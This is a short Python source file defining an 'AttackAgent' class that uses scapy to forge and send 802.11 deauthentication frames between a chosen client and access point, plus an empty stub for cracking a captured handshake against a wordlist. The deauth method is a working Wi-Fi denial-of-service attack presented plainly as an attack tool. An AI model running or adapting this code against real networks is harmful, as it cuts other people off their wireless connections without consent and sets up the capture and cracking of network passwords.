from NetworkController import NetworkController
from scapy.all import *

class AttackAgent:

    def __init__(self):
        pass

    def deauth(self, target, access_point, packet_count=100):
        interface = NetworkController().interface
        access_point_pkt = RadioTap()/Dot11(addr1=target, addr2=access_point, addr3=access_point)/Dot11Deauth()
        target_pkt = RadioTap()/Dot11(addr1=access_point, addr2=target, addr3=target)/Dot11Deauth()

        for _ in range(packet_count):
            sendp(access_point_pkt, iface=interface)
            sendp(target_pkt, iface=interface)

    def crack(self, handshake, wordlist):
        pass